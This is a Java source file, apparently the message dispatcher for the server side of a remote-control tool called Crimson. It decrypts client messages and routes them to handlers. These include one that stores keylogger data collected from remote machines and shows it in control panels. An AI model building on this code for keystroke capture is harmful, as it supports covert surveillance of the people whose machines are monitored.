package subterranean.crimson.server;

import javax.swing.JFrame;

import subterranean.crimson.server.graphics.DesktopControlPanel;
import subterranean.crimson.server.graphics.frames.MainScreen;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Cryptography;
import subterranean.crimson.universal.EncType;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.StreamStore;
import subterranean.crimson.universal.containers.Day;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.containers.SystemMessage;
import subterranean.crimson.universal.objects.InvalidObjectException;
import subterranean.crimson.universal.objects.ObjectTransfer;

public enum Executor {

	;

	public static void execute(final Message m, final Connection c) {
		// decode the aux if needed
		if (c.encryption != EncType.None) {
			for (int i = 0; i < m.auxObject.length; i++) {
				try {
					m.auxObject[i] = ObjectTransfer.fromString(Cryptography.decrypt((byte[]) m.auxObject[i], c.encryption, c.key));
				} catch (InvalidObjectException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}
		new Thread(new Runnable() {
			public void run() {
				exe(m, c);
			}
		}).start();
	}

	private static void exe(Message m, Connection c) {
		switch (m.getName()) {
		case BMN.DISCONNECTION: {
			return;

		}
		case BMN.INCOMING_keyloggerData: {
			if (m.auxObject[0] == null) {
				// thats not right...
				return;
			}

			c.getProfile().log.add((Day[]) m.auxObject[0]);

			// just update all control panels. How many could the user have open at once
			// right?

			for (JFrame cp : Server.controlPanels) {
				try {
					((DesktopControlPanel) cp).updateKeylogger();
				} catch (Throwable t) {
					// do nothing for now
				}

			}
			break;
		}
		case BMN.INCOMING_systemMessage: {
			// a system message has been sent
			if (m.auxObject[0] == null) {
				// error
				Logger.add("Error: Got null payload");
			}
			SystemMessage sm = (SystemMessage) m.auxObject[0];
			c.getProfile().messages.add(sm);
			break;
		}

		case BMN.CHAT_message: {
			// got a message from the client
			for (JFrame cp : Server.controlPanels) {
				DesktopControlPanel cpp = (DesktopControlPanel) cp;
				if (cpp.c == c) {
					// cpp.addMessage((String) m.auxObject[0], "" + c.clientID);
					break;
				}
			}
			break;
		}
		case BMN.STREAM_data: {
			try {
				StreamStore.getStream((int) m.auxObject[0]).received(m);
			} catch (NullPointerException e) {
				// the stream no longer exists
			}
			break;
		}
		case BMN.INCOMING_activityStatus: {
			c.getProfile().info.setActivityStatus((String) m.auxObject[0]);
			MainScreen.window.repaint();
			break;
		}
		case BMN.PROXY_message: {
			int receiver = (int) m.auxObject[1];
			Message mm = (Message) m.auxObject[2];

			if (receiver == 0) {
				// check for recursive loops
				if (mm.getName() == BMN.PROXY_message) {
					Logger.add("Received Recursive Proxy");
					return;
				} else {
					exe(mm, c);
				}
			} else {
				Logger.add("Received proxy message not targeted at server");
			}
			break;
		}
		case BMN.INCOMING_processStatus: {
			c.getProfile().info.setCurrentClientOperation((String) m.auxObject[0]);
		}

		default: {
			c.i.add(m);
			break;
		}
		}

	}
}
